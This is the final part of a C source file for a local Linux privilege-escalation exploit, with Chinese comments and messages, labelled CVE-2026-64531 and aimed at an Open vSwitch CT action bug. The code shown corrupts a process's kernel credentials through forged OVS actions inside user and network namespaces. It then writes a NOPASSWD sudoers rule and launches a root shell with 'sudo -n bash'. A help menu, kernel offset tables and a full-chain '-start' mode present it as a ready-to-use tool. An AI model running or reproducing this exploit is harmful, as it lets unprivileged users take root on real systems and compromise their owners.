    pr_dim("  writer pid=%d task=0x%llx cred=0x%llx\n",
           writer_pid, (unsigned long long)task, (unsigned long long)cred);

    pr_step("改写 writer 的 cred");
    if (p->k.ref_kind == 0) {
        /* 新内核：dst_entry 用 __rcuref，只能一次减 1，靠次数把 fsuid 减到 0 */
        if (decrement_to_zero(&p->r, &p->w, cred + (uint64_t)p->k.cred_fsuid,
                              "fsuid") != 0)
            return -1;
        if (decrement_to_zero(&p->r, &p->w, cred + (uint64_t)p->k.cred_fsgid,
                              "fsgid") != 0)
            return -1;
    } else {
        /* 旧内核：__refcnt 是 atomic_t，0 减一次回绕成 0xffffffff */
        if (panic_on_warn()) {
            pr_err("  panic_on_warn=1，旧内核的回绕会触发 WARN 并重启；先关掉\n");
            return -1;
        }
        pr_dim("  legacy __refcnt：capability 字回绕会打一条非致命 WARN\n");
        if (zero_to_all_ones(&p->r, &p->w,
                             cred + (uint64_t)p->k.cred_cap_permitted,
                             "cap_permitted.low") != 0)
            return -1;
        if (zero_to_all_ones(&p->r, &p->w,
                             cred + (uint64_t)p->k.cred_cap_effective,
                             "cap_effective.low") != 0)
            return -1;
    }

    pr_step("让 writer 写 sudoers");
    if (write(trig_fd, "1", 1) != 1) {
        pr_err("  触发 writer 失败: %s\n", strerror(errno));
        return -1;
    }
    while (total < (int)sizeof(ack) - 1) {
        n = read(ack_fd, ack + total, sizeof(ack) - 1 - (size_t)total);
        if (n <= 0)
            break;
        total += (int)n;
    }
    ack[total] = '\0';
    close(trig_fd);
    close(ack_fd);

    if (total < 2 || ack[0] != '1') {
        pr_err("  writer 报告失败: %s", total ? ack : "(无应答)\n");
        return -1;
    }
    pr_ok("  sudoers 写入成功: %s", ack + 2);
    return 0;
}

/* -------------------------------------------------------------------------
 * 入口
 * ---------------------------------------------------------------------- */

static void banner(void)
{
    pr_raw("\n");
    if (g_color)
        fputs(C_CYA, stdout);
    pr_raw("CVE-2026-64531  Open vSwitch CT action 越界\n");
    if (g_color)
        fputs(C_RST, stdout);
    pr_dim("  ovswrap %s  ·  C 移植版\n", OVSWRAP_VERSION);
    pr_dim("  攻击链：userns+netns -> OVS datapath -> 伪造 SET action\n"
           "          -> 任意读 / dst_release 递减 -> sudoers -> sudo bash\n");
    pr_dim("  配置表：offset/<N>系/<release>/target.h，放进去就用，不用重编\n");
    if (krec_load(&g_krec) == 0)
        pr_dim("  内嵌表：%u 条存量记录，作为配置表没命中时的兜底\n\n",
               g_krec.n_rec);
    else
        pr_dim("  内嵌表：数据损坏，只能走本地推导\n\n");
}

static void usage(const char *prog)
{
    banner();
    pr_raw("用法: %s <模式> [选项]\n\n", prog);
    pr_raw("模式:\n");
    pr_raw("  -check     只做前置条件检查（配置表 / 模块 / BTF / pahole / userns）\n");
    pr_raw("  -dump-krec   导出本机内核偏移记录（JSON），喂给 tools/add_krec.py\n");
    pr_raw("  -dump-target 导出本机配置表（target.h），放进 offset/<N>系/<release>/\n");
    pr_raw("  没有 BTF 时可以用 tools/kmod 的内核模块直接读偏移（见该目录）\n");
    pr_raw("  -scan      建立读写原语并自检读一个已知地址，不修改任何东西\n");
    pr_raw("  -start     完整链：改 host writer 的 cred -> 写 sudoers -> root shell\n");
    pr_raw("  -h         帮助\n\n");
    pr_raw("选项:\n");
    pr_raw("  -t <user>  指定写入 sudoers 的 host 用户名（默认当前用户）\n");
    pr_raw("  -offset <dir>  配置表根目录（默认 ./offset、<exe 目录>/offset、\n"
           "                 /usr/share/dirtyfrag/offset）\n");
    pr_raw("  -krec <release>  用另一条 release 的配置（先查 offset/，再查内嵌表）\n");
    pr_raw("  -force-derive  忽略配置表和内嵌表，强制走 BTF / System.map 推导\n");
    pr_raw("  -carrier / -wcarrier / -lanes / -tunnel-info  "
           "配合 -dump-krec 填行为参数\n");
    pr_raw("  -from <release>  配合 -dump-krec：从表里抄一条再改成本机的\n");
    pr_raw("  -v         详细输出\n");
    pr_raw("  -nc        关闭彩色\n\n");
    pr_raw("注意:\n");
    pr_raw("  必须以普通用户运行（root 会被拒绝），且 openvswitch 模块已加载。\n");
    pr_raw("  /etc/sudoers 或 /etc/sudoers.d 会被写入一条 NOPASSWD 规则，\n");
    pr_raw("  跑完记得删掉；/etc/sudoers 如果被追加，重启前请先 visudo -c 检查。\n\n");
}

int main(int argc, char **argv)
{
    int mode = 0;
    const char *user_arg = NULL;
    struct host_user hu;
    struct prim p;
    char dpname[32];
    int i;

    for (i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-check"))
            mode = 1;
        else if (!strcmp(argv[i], "-scan") || !strcmp(argv[i], "-test"))
            mode = 2;
        else if (!strcmp(argv[i], "-start"))
            mode = 3;
        else if (!strcmp(argv[i], "-v"))
            g_verbose = 1;
        else if (!strcmp(argv[i], "-force-derive"))
            g_force_derive = 1;
        else if (!strcmp(argv[i], "-krec") && i + 1 < argc)
            g_krec_force = argv[++i];
        else if (!strcmp(argv[i], "-dump-krec")) {
            mode = 4;
        } else if (!strcmp(argv[i], "-dump-target")) {
            mode = 4;
            g_dump_target = 1;
        } else if (!strcmp(argv[i], "-offset") && i + 1 < argc) {
            g_offset_dir = argv[++i];
        }
        else if (!strcmp(argv[i], "-carrier") && i + 1 < argc) {
            const char *v = argv[++i];

            if (strcmp(v, "timeout") && strcmp(v, "labels-only")) {
                fprintf(stderr, "-carrier 只接受 timeout / labels-only\n");
                return 2;
            }
            g_dump_carrier = v;
            g_dump_wcarrier = v;
            g_dump_carrier_set = 1;
        } else if (!strcmp(argv[i], "-wcarrier") && i + 1 < argc) {
            const char *v = argv[++i];

            if (strcmp(v, "timeout") && strcmp(v, "labels-only")) {
                fprintf(stderr, "-wcarrier 只接受 timeout / labels-only\n");
                return 2;
            }
            g_dump_wcarrier = v;
        } else if (!strcmp(argv[i], "-lanes") && i + 1 < argc) {
            if (parse_dump_lanes(argv[++i]) != 0)
                return 2;
            g_dump_lanes_set = 1;
        } else if (!strcmp(argv[i], "-tunnel-info") && i + 1 < argc) {
            g_dump_tunnel_info = atoi(argv[++i]);
            g_dump_ti_set = 1;
        } else if (!strcmp(argv[i], "-from") && i + 1 < argc) {
            g_dump_from = argv[++i];
        }
        else if (!strcmp(argv[i], "-nc"))
            g_color = 0;
        else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
            usage(argv[0]);
            return 0;
        } else if (!strcmp(argv[i], "-t") && i + 1 < argc) {
            user_arg = argv[++i];
        }
        /* 其它参数（比如 GUI 传进来的 -2026-64531）直接忽略 */
    }

    if (!mode) {
        usage(argv[0]);
        return 2;
    }

    if (mode == 4)
        return do_dump_krec();   /* 不打 banner，stdout 只留 JSON */

    banner();

    if (mode == 1)
        return do_check();

    if (check_launch_user(&hu) != 0)
        return 1;
    if (user_arg) {
        snprintf(hu.name, sizeof(hu.name), "%s", user_arg);
        pr_dim("  写入 sudoers 的用户: %s（命令行指定）\n", hu.name);
    } else {
        pr_dim("  写入 sudoers 的用户: %s (uid=%u)\n", hu.name, (unsigned)hu.uid);
    }

    snprintf(dpname, sizeof(dpname), "vhrd%u", (unsigned)(getpid() % 10000));

    if (mode == 2) {
        pid_t pid = fork();
        int st = 0;

        if (pid < 0) {
            pr_err("fork 失败: %s\n", strerror(errno));
            return 1;
        }
        if (pid == 0) {
            if (enter_private_ns(hu.uid, hu.gid) != 0)
                _exit(2);
            if (setup_primitives(&p, dpname, g_verbose) != 0)
                _exit(3);
            _exit(do_scan(&p) == 0 ? 0 : 4);
        }
        waitpid(pid, &st, 0);
        if (WIFEXITED(st) && WEXITSTATUS(st) == 0)
            return 0;
        if (WIFEXITED(st))
            pr_err("自检失败（阶段码 %d）\n", WEXITSTATUS(st));
        return 1;
    }

    /* -start */
    {
        char dropin[128];
        char used_user[64];
        pid_t wpid, pid;
        int trig = -1, ack = -1;
        int st = 0;

        snprintf(used_user, sizeof(used_user), "%s", hu.name);
        snprintf(dropin, sizeof(dropin), "/etc/sudoers.d/ovs_c004_%d", (int)getpid());

        wpid = fork_sudoers_writer(dropin, used_user, &trig, &ack);
        if (wpid < 0) {
            pr_err("fork sudoers writer 失败: %s\n", strerror(errno));
            return 1;
        }

        pid = fork();
        if (pid < 0) {
            pr_err("fork exploit 失败: %s\n", strerror(errno));
            return 1;
        }
        if (pid == 0) {
            int ret;

            if (enter_private_ns(hu.uid, hu.gid) != 0)
                _exit(2);
            if (setup_primitives(&p, dpname, g_verbose) != 0)
                _exit(3);
            ret = do_start(&p, (int)wpid, trig, ack);
            _exit(ret == 0 ? 0 : 4);
        }

        close(trig);
        close(ack);
        waitpid(pid, &st, 0);

        if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
            if (WIFEXITED(st))
                pr_err("利用失败（阶段码 %d）\n", WEXITSTATUS(st));
            return 1;
        }

        pr_raw("\n");
        pr_ok("提权完成。现在用 sudo -n 打开 root shell…\n");
        pr_dim("    （namespace 里的进程仍然挂着，别手动 kill 它）\n\n");
        execlp("sudo", "sudo", "-n", "bash", (char *)NULL);
        pr_err("exec sudo 失败: %s\n", strerror(errno));
        return 1;
    }
}
